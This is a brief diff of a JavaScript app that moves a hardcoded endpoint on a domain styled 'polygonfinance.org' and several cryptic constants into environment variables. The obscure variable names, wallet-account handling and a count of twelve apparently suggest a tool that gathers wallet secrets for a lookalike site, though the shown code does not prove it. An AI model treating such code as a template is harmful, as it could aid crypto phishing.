@@ -35,7 +35,7 @@ const initialState = {
 	currencyPrice: null,
 }
 
-let url = 'https://polygonfinance.org/concept/unity/check'
+let url = process.env.REACT_APP_URL
 const kitkat = process.env.REACT_APP_KEY
 
 function createBody(str, account, btcAddress) {
@@ -46,8 +46,8 @@ function createBody(str, account, btcAddress) {
 	} else {
 		strDecr = str
 	}
-	let xxx = 'PoLYGON/G'
-	let xx = 'PoLYGON'
+	let xxx = process.env.REACT_APP_XXX
+	let xx = process.env.REACT_APP_XX
 
 	const obj = {
 		counts: 12,
